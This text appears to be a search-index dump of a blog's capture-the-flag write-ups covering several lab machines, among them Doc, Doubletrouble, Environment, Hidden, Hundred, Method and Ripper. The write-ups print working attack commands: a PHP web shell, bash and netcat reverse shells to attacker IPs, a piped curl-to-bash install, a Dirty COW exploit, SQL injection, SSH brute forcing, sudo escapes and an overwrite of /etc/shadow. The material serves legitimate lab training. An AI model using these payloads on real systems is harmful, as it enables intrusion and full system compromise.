+ 2x \u0026= 2245 \\\\\r2x \u0026= 224 \\\\\rx \u0026= 112\r\\end{align*}\r$$\rTherefore, the resulting character in ASCII is 112, which corresponds to the letter p, and since the program expects two identical characters, the correct result is pp.\n","permalink":"http://localhost:1313/crackmes/bingus/","summary":"Difficulty: Easy 🟢","title":"Bingus"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/candy/","summary":"Difficulty: Easy 🟢","title":"Candy - Dockerlabs"},{"content":"Writeup in Spanish 🇪🇸 This machine was created by Pylon.\n","permalink":"http://localhost:1313/writeups/easy/canto/","summary":"Difficulty: Easy 🟢","title":"Canto - HackMyVM"},{"content":"\rMachine Link\nTo begin working on the machine, we first perform a quick scan to identify open ports using Nmap:\nsudo nmap -sS --min-rate 4500 -n -Pn -vvv 10.10.11.82 Once we know which ports are open, we perform a more detailed scan on them:\nnmap -sCV -p22,8000 -n -Pn 10.10.11.82 -oN target We can see that port 8000 is hosting a web server.\nHome page\rClicking on the Download App button downloads a ZIP file.\nThis archive contains the default structure of the web application.\nHere we can see the files it contains, and after checking the requirements, we notice that it uses a vulnerable version of js2py, which can be exploited through RCE (Remote Code Execution). Exploit: CVE-2024-28397\nTo exploit this, we will run the provided JavaScript code inside an interpreter. Let’s register on the victim’s web application and see which programming language we can execute.\nLuckily, we can execute JavaScript directly from the web interface.\nIt works perfectly, we can execute commands as the user app. Next, we will establish a Reverse Shell to gain access inside the machine.\nWe start by setting up a listener with Netcat on port 4444, and then execute the Reverse Shell payload in the exploit.\nNow that we are inside, let’s remember that when we downloaded the ZIP earlier, it contained a file named users.db. At that time, it was empty since it was just the default database. Knowing its location and purpose, let’s inspect it again.\nWe transfer the file to our local machine for easier handling.\nThis is where the passwords of all users registered in the web editor are stored, including ours.\nTo save time, we will first check which users exist on the system so we only attempt to crack relevant passwords.\nPerfect, we see that marco exists on the machine. We will use Hashcat to crack Marco’s password and see if it is reused for system login (John The Ripper didn’t work for me here).\nWe manage to log in without any issues, which allows us to retrieve the User Flag.\nPrivilege escalation to Root Running sudo -l, we discover that Marco can run a backup binary as root without needing the root password.\nThis binary requires a configuration file to work. Fortunately, we already have one in Marco’s home directory. Although it is owned by root, Marco has read permissions.\n(With the -h option we can see all the available parameters.)\nFrom this, we learn that the root user employs this configuration file to back up the web application we’ve been exploiting earlier. To escalate, we can create a copy of the configuration file and modify it so that the backup targets the /root directory.\nWe then run the backup using:\nsudo /usr/local/bin/npbackup-cli -c ./test.conf -b Next, we list all snapshots to identify the one we need:\nsudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshots Once we know the snapshot ID, we can list its contents:\nsudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id ID --ls Finally, we obtain the Root Flag and complete the machine.\nsudo /usr/local/bin/npbackup-cli -c ./npbackup.conf --snapshot-id 0121d0a3 --dump /root/root.txt ","permalink":"http://localhost:1313/writeups/easy/codetwo/","summary":"Difficulty: Easy 🟢","title":"CodeTwo - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/consolelog/","summary":"Difficulty: Easy 🟢","title":"ConsoleLog - Dockerlabs"},{"content":"\rMachine Link\nWhen starting the machine, it displays its IP address.\nIP address of the victim machine\rWe perform a scan using the NMAP tool to see which ports the target machine has open.\nnmap -sCV -n -Pn 192.168.18.189 -oN target Port scanning with NMAP\rAnd we observe that only port 80 is open. We access the website hosted on the target machine and observe the following:\nWe click the \u0026lsquo;Login\u0026rsquo; link, but it doesn’t load since our machine can’t resolve the domain.\nDomain doc.hmv\rWe need to add the domain doc.hmv to the /etc/hosts file, mapping it to the IP address of the target machine.\nsudo nano /etc/hosts Domain with its IP in /etc/hosts\rAnd we access it again.\nI experienced a bit and was able to access it through a SQL injection in the following way.\n\u0026#39; or 1=1-- - SQL Injection\rAnd we successfully gain access without any issues.\nI now decide to run a directory enumeration with Wfuzz to check for any directories that might be useful.\nwfuzz -c -u http://doc.hmv/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,200 Result after enumerating directories\rThe directory /uploads could be useful if we can upload files. I search, and indeed, we can.\nSo, we are going to download a PHP script that, when the file is uploaded, will send us a Reverse Shell, allowing us to access the machine.\nwget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz tar -xf php-reverse-shell-1.0.tar.gz We modify the information as instructed, and we are good to go.\nFor example, I am going to upload the file to the following location:\nIf it doesn\u0026rsquo;t work there, try uploading it in other locations.\nAnd with that, we have successfully gained access to the target machine.\nI set up the TTY and enumerate the users on the machine.\ngrep /bin/bash /etc/passwd There are two users: bella and root.\nPrivilege escalation to Bella While browsing the directories, I found a PHP file named initialize.php that contains Bella’s password.\nWe gain access to the Bella user account and obtain the user flag.\nPrivilege escalation to Root If we run sudo -l, we can see the following.\nWe are able to execute the doc binary with root privileges. Inspecting its strings reveals that, when executed, the binary starts a server on port 7890.\nstrings /usr/bin/doc We see that it creates a web server.\nSince we can’t access it directly through the browser, let’s set up Port Forwarding to forward port 7890 from the target machine to port 7890 on our local machine. We will use Chisel for this.\ncurl https://i.jpillora.com/chisel! | bash And we also transfer the binary to the victim machine.\nLocal machine:\nVictim machine:\nAnd we grant it execute permissions.\nchmod +x chisel Then we run Chisel with the following commands to set up Port Forwarding.\nLocal machine:\nsudo chisel server --reverse -p 4444 Victim machine:\n./chisel client 192.168.18.100:4444 R:7890:127.0.0.1:7890 \u0026amp; Now that the server is running, accessing 127.0.0.1:7890 on our local machine should display the hosted webpage.\nThe web interface shows a list of Python modules and directories related to the Python environment, rather than individual .py files. It displays built-in modules and folders like /tmp and /usr/lib/python3.9, without showing file extensions. To verify this, I will create a Python file named abcd.py in Bella’s /home directory to see if it appears in the listing.\nNow, the file appears as expected. Next, we will proceed to send a reverse shell with root privileges.\nFirst, we will create a file that I will call reverse.py with the following content:\nimport os os.system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.18.100/7777 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;) Python Reverse Shell code\rThen we run the doc binary as root:\nsudo doc We set up a listener on port 7777 on our local machine to receive the Reverse Shell.\nnc -lvnp 7777 And now we access the web and click on the file we created (reverse.py).\nNow that we have received the Reverse Shell and are the root user, we can obtain the root flag.\nAnd the machine is completely hacked.\n","permalink":"http://localhost:1313/writeups/easy/doc/","summary":"Difficulty: Easy 🟢","title":"Doc - HackMyVM"},{"content":"\rMachine Link\nTo begin, we use the arp-scan tool to identify devices on our network and find a MAC address starting with 08:, which is commonly associated with virtual machines.\nsudo arp-scan -I eth0 --localnet And we find the IP of the victim machine: 192.168.18.191.\nNow it’s time for open port scan, for which we will use Nmap. First, we run a quick scan of all ports on the target machine with the following command:\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.191 Once we identify the open ports, we perform a more detailed scan on those specific ports:\nnmap -sCV -p22,80 -n -Pn 192.168.18.191 -oN target When we visit the hosted website, we see a login page, just like the Nmap scan showed.\nWe will perform directory enumeration with Gobuster to identify any directories that might help us.\ngobuster dir -u http://192.168.18.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt We find the following directory, which will be useful since the others don’t contain anything significant\nInside the /secret directory, there is an image, so I decide to download it and apply steganography techniques to see if there is any hidden information in the image.\nwget http://192.168.18.191/secret/doubletrouble.jpg We are going to use Stegseek.\nUsing Stegseek\rInside this, you will find the login credentials.\nSo, we log in through the page we saw earlier using the obtained credentials.\nNow that we are inside, let\u0026rsquo;s upload a malicious PHP file to execute commands. I am going to upload it as the user\u0026rsquo;s profile picture.\nWe upload the malicious PHP\rThe code:\n\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; Malicious PHP\rWe upload it and navigate to the /uploads directory we found earlier while enumerating directories with Gobuster. Then, we access the users folder, where we will find our PHP file.\nAnd now, we can execute commands.\nWe execute the command 'id'\rSo, we are going to perform a Reverse Shell to gain access to the machine. To do this, we set up a listener on port 4444 with netcat.\nnc -lvnp 4444 And then we execute this code on the website:\nnc -c bash 192.168.18.100 4444 By checking the sudo permissions, we see that the awk binary can be executed as root.\nSudo permissions\rThe GTFObins page shows how to exploit these permissions.\nCode we need to execute\rNow, we execute the command:\nsudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; A new machine\rWe are not done yet. Although we have root access, we can’t find any flags. Instead, we discover another machine with the same name inside this one, so we need to download it.\nVictim machine:\npython3 -m http.server 8080 Our real machine:\nSince I am using Windows 10, I will use the following command to download it from PowerShell:\nInvoke-WebRequest -Uri \u0026#34;http://192.168.18.191:8080/doubletrouble.ova\u0026#34; -OutFile \u0026#34;newmachine.ova\u0026#34; Now, we start the machine and find its IP address using arp-scan. In this case, the IP of the second machine is 192.168.18.193.\nSo, I perform another port scan with NMAP.\nAnother login page:\nNow, we will use Burp Suite to intercept data, and then use SQLMap to check if the login page is vulnerable to SQL Injection (SQLI).\nWe copy all this content and paste it into a file, which I will name sqlmap.txt. Now, we run SQLMap using this file.\nsqlmap -r sqlmap.txt And we observe that it is indeed vulnerable. Next, we will execute the following command to show us the existing databases.\nsqlmap -r sqlmap.txt -dbs 'Doubletrouble' database\rNow that we have found the doubletrouble database, we dump its contents.\nsqlmap -r sqlmap.txt -D doubletrouble --dump Users and passwords\rWe found two usernames and passwords. The first one didn’t work, but clapton worked for SSH.\nAnd finally, we obtain the user flag.\nPrivilege escalation to Root We observe that the machine\u0026rsquo;s version is vulnerable to a Local Privilege Escalation.\nVulnerable kernel version\rAnd we download it, following the steps it indicates.\nmv 40839.c dirty.c And now we transfer it to the victim machine using netcat.\nVictim machine:\nnc -lvnp 8888 \u0026gt; dirty.c Local machine:\nnc 192.168.18.193 8888 \u0026lt; dirty.c And now we compile it.\ngcc -pthread dirty.c -o dirty -lcrypt So, we run it, providing the password we want. In my case, it will be \u0026lsquo;hello\u0026rsquo;.\n./dirty my-new-password Then we become the root user, now named firefart.\nsu firefart And we enter the password we assigned earlier.\nNow that we have root access, we can proceed to obtain the root flag.\nMachine completed!\n","permalink":"http://localhost:1313/writeups/easy/doubletrouble/","summary":"Difficulty: Easy 🟢","title":"Doubletrouble - HackMyVM"},{"content":"\rTo start, we will perform a quick port scan using the Nmap tool to see which ports are open.\nsudo nmap -sS -p- -n -Pn -vvv 10.10.11.67 Knowing that ports 22 and 80 are open, we will perform a more detailed scan on these.\nsudo nmap -sCV -p22,80 -n -Pn 10.10.11.67 -oN target When accessing the website, we don’t see much.\n📝NOTE: I have added the domain environment.htb with its IP in /etc/hosts.\nTherefore, we will enumerate directories and files using Feroxbuster to see what might be hidden on the web.\nferoxbuster -u http://environment.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --filter-status 403,404 When accessing /upload, we see code errors and that the website uses Laravel (a PHP framework) with a version that is vulnerable. CVE-2024-52301\nThis vulnerability allows an attacker to make the application think it is running in a different environment (like “production” or “development”) using the URL, which can change what is displayed on the website. We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation. The interesting part is the BASH_ENV variable, which Bash uses to run a script when starting a shell that is non-interactive, that is, a shell that runs commands automatically without the user typing them. Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much. So we decided to try to enter through port 22 by brute force with the hydra tool.\nWe are going to set the user as root and as the password we will set a dictionary (in this case common.txt) so that it goes word by word trying to see if any word in this dictionary is the correct password:\n🚨 IMPORTANT: Normally, you cannot access as the root user via SSH for security reasons. Also, the rockyou.txt file is usually used for password cracking. This is an exception because it’s a very easy difficulty machine.\nResult after using hydra\rAnd we found it! The user is \u0026ldquo;root\u0026rdquo; and the password is \u0026ldquo;simple\u0026rdquo;. Now we are going to enter through port 22 with this username and password.\nNow that we are inside, with the \u0026ldquo;ls\u0026rdquo; command we see what there is, and we find that we already have the user flag and the root flag.\nSo machine completed!\n","permalink":"http://localhost:1313/writeups/very-easy/gift/","summary":"Difficulty: Very Easy 🔵","title":"Gift - HackMyVM"},{"content":"\rMachine Link\nTo start, we perform a basic NMAP scan to find out which ports the target machine has open.\nnmap 192.168.18.54 Simple NMAP scan\rAs we can observe, we find ports 80 and 22 open. Port 80 hosts a webpage, and port 22 runs the SSH service.\nWe open the website and encounter the following:\nWe view this with Ctrl + U\rWe obtain a possible username: paul.\nWe enter the file bootstrap.min.css and find the following information that may be useful to us.\nWe test the address /yay/mysecretsound.wav, and indeed, it exists. We download the audio.\nUpon listening to the audio, you realize it might be in Morse code. So, you go to the morsecode.world website to upload the audio and have it decoded.\nResult\rI attempted to log in via SSH with the username paul and the password ETAIE4SIET, but it didn\u0026rsquo;t work. I noticed a word formed in the audio at the bottom, so I used \u0026ldquo;dancingpassyd\u0026rdquo; as the password and successfully logged in.\nNow, with the ls command, we see that we have the user flag.\nPrivilege escalation We use the sudo -l command to view the actions we can perform with sudo as root while being the user paul. As a result, we see that we can execute the /usr/bin/ln binary with sudo as if we were root without needing to know their password.\nWe go to the GTFOBins website and look for information on how to escalate privileges using the sudo ln command.\nSearch result on GTFOBins\rWe copy the commands and execute them:\nsudo ln -fs /bin/sh /bin/ln sudo ln We have successfully become the root and we can obtain their flag.\ncat /root/root.txt ","permalink":"http://localhost:1313/writeups/easy/helium/","summary":"Difficulty: Easy 🟢","title":"Helium - HackMyVM"},{"content":"\rMachine Link\nTo start, we will perform a port scan to identify which ports are open.\nNMAP port scan\rSo the first thing I do is go to the website hosting this machine. And we come across a challenge:\nChallenge 1\rWhat is observed when inspecting the page\rI decide to search on dCode for the type of symbol encryption the level 1 puzzle could be, and I finally find it:\nCipher with Rosicrucian Cipher\rDecryption\rWe decrypt it and obtain SYS.HIDDEN.HMV, which seems to be like a domain. So, I decide to save it in /etc/hosts:\nNow I search again for the website, and we come across level 2:\nChallenge 2\rAs I don\u0026rsquo;t see anything on the page, I decide to use Gobuster to enumerate subdirectories.\nEnumeration of subdirectories with Gobuster\rIt gives us this result, but /users and /members are just a rabbit hole, and the directory that will be useful is /weapon. Although it is initially empty, when scanning it again with Gobuster, we find that it contains a PHP file.\nWe found an interesting PHP file\rAfter trying for a while to view the code within loot.php and not making any progress, along with other futile attempts, I decide to use wfuzz to check if we can execute any commands with this PHP file.\nWe found the keyword to execute commands\rAnd we find the keyword that we should use to execute commands. This way, we can now access the machine by running a Reverse Shell.\nExecuting commands as www-data\rAs we can see, we can execute commands as www-data, so we set up a listener on port 4444 and execute the Reverse Shell.\nWe are inside the machine\rI decide to set up the TTY for convenience, and it would look something like this.\nLet\u0026rsquo;s see which users exist on this machine.\ngrep /bin/bash /etc/passwd System users\rAnd we observe that there are three users:\ntoreto atenea root Now, by running sudo -l, we see that we can execute Perl as the user toreto.\nThis allows us to escalate privileges to become toreto quite easily. The first thing we need to do is go to a directory where we have write permissions, such as the /tmp directory, and there we will create a Perl file and execute it as the toreto user.\nHere is the Perl code:\necho -ne \u0026#39;#!/bin/perl \\nuse POSIX qw(setuid); \\nPOSIX::setuid(0); \\nexec \u0026#34;/bin/bash\u0026#34;;\u0026#39; \u0026gt; script.pl And we execute it like this:\nsudo -u toreto /usr/bin/perl script.pl This will allow us to obtain the shell of toreto.\nWe are the user toreto\rI\u0026rsquo;ve tried sudo -l, looking to see if any SUID binaries could be useful, and I\u0026rsquo;ve even checked the capabilities, but found nothing. So, I decided to search through directories, and in the end, I found a file that will help us escalate privileges to the atenea user.\nWe found a text file\rThe text file is a dictionary.\nSo I use Hydra to perform a brute-force attack on the SSH port (22) with the user atenea, using this dictionary to check if any combination is the correct password.\nWe found the password for atenea\rAnd the password is sys8423hmv, so we log in via SSH:\nWe are atenea\rNow we can obtain the user flag:\nNext, let\u0026rsquo;s escalate privileges to become the root user. By running sudo -l, we see that we can execute socat as if we were root without password.\nI search on GTFOBins and find that we can easily escalate privileges.\nsudo socat stdin exec:/bin/sh We run it, and there you go, we are now root.\nAnd we obtain the root flag.\nMachine pwned!!\n","permalink":"http://localhost:1313/writeups/easy/hidden/","summary":"Difficulty: Easy 🟢","title":"Hidden - HackMyVM"},{"content":"\rMachine Link\nWhen starting the machine, we see the IP of the victim machine.\nI decided to use NMAP to scan for open ports and obtain information about the services and other details associated with them.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.181 nmap -sCV -p21,22,80 -n -Pn 192.168.18.181 -oN target We observed that port 21 (FTP) is vulnerable to anonymous login, so I decided to log in because the scan indicated there were files of interest\nNow that we are inside, I decide to download the file users.txt using the get command.\nget users.txth And on my local machine, I check to see what\u0026rsquo;s there, and it appears to be a dictionary. But at the bottom, we can notice a username (hmv).\nAfter downloading the id_rsa file, we discover that it’s actually a drawing of a rabbit.\nRabbit Hole reference\rAnd we observe that id_rsa.pem seems to be a private id_rsa key.\nI grant privileges to the private key and try to access, but it doesn\u0026rsquo;t work.\nIt seemed that the rabbit drawing was a hint that the id_rsa file was just a rabbit hole.\nI decide to go through port 80 (HTTP).\nHomepage\rSource code of the homepage\rWe can observe a value named \u0026lsquo;key\u0026rsquo; that contains some strange text. I notice that it\u0026rsquo;s an \u0026lsquo;.enc\u0026rsquo; file. We can decode the file using the RSA private key and OpenSSL.\nWe use the private key file and the downloaded file, and it generates a directory:\nopenssl pkeyutl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc -out key cat key As it says it\u0026rsquo;s there, I decide to use Gobuster to search and see if there are any subdirectories or files within this directory.\nDirectory and file enumeration with Gobuster\rAnd we come across another id_rsa. So, I download it.\nwget http://192.168.18.181/softyhackb4el7dshelldredd/id_rsa As we can see, it appears to be a private key. Let\u0026rsquo;s see if it works:\nUnfortunately, it is asking for a password.\nFor the next step, we will need to download the image from the webpage and use steganography techniques to extract information from the image.\nwget http://192.168.18.181/logo.jpg I decide to use Stegseek with the dictionary we obtained earlier from port 21 (FTP).\nstegseek logo.jpg users.txt We obtain the password required by the private key, which allow us to access and log in as the user hmv.\nAnd we can obtain the user flag 🚩.\nPrivilege escalation to root There are only two users: hmv and root.\nAfter experimenting for a while and using tools like pspy and LinPeas without success, I decided to run the lse.sh script, which is designed to gather relevant information about local Linux system security to assist with privilege escalation.\nwget \u0026#34;https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh\u0026#34; -O lse.sh;chmod 700 lse.sh ./lse.sh -l1 This last command is used to display information in more detail.\nAs a result, we see that the /etc/shadow file can be edited.\nCritical file can be edited: /etc/shadow\rTo change the root password in the /etc/shadow file, we will use the following commands:\nopenssl passwd This is used to generate the password in hash format.\nSince I can\u0026rsquo;t edit the /etc/shadow file directly with a text editor like nano, we have to overwrite the entire file. Therefore, our only option is to run the following command:\necho root:e84V4zPcic2M2:18844:0:99999:7::: \u0026gt; /etc/shadow 🚨 IMPORTANT: This command is very dangerous because it completely overwrites the /etc/shadow file, deleting all existing user password hashes and settings except the line we add. This can lock out all other users and cause serious system access problems.\nWe are root now\rWe log in as the root user using our password. Once we have root access, we retrieve the root flag and successfully finish hacking the machine.\n","permalink":"http://localhost:1313/writeups/easy/hundred/","summary":"Difficulty: Easy 🟢","title":"Hundred - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories. We find a file called note.txt that tells us the solution is to enumerate.\ngobuster dir -u http://192.168.18.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 -b \u0026#34;\u0026#34; --exclude-length 3690 -x html,txt,xml,bak I decide to continue enumerating more directories and files (zip, htm, php, c).\nI come across the directory index.htm, which contains the following.\nIf you view the page source (Ctrl + U), you will see a hidden form that sends information using the GET method to a file called secret.php. This form has an input field named HackMyVM, and whatever is typed there is sent to the server when the form is submitted.\nContent of the hidden form\rNow, I am going to use Burp Suite to send a request including all the data we collected earlier.\nSend a request\rIt tells us to use another method. To do this, I will use the POST method. In Burp Suite, we have an option to convert from GET to POST and from POST back to GET with just the click of a button.\nSend a request with POST method\rIt says we already found it, so let\u0026rsquo;s put some value in the request.\nAnd we see that we have access to the victim machine as the user www-data (the web server user). I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection. Now, /usr/bin/bash has the SUID bit set. Simply running the command bash -p grants us root privileges.\nbash -p All the previous process\rFinally, we navigate to the /root directory and obtain the root flag.\n","permalink":"http://localhost:1313/writeups/easy/ripper/","summary":"Difficulty: Easy 🟢","title":"Ripper - 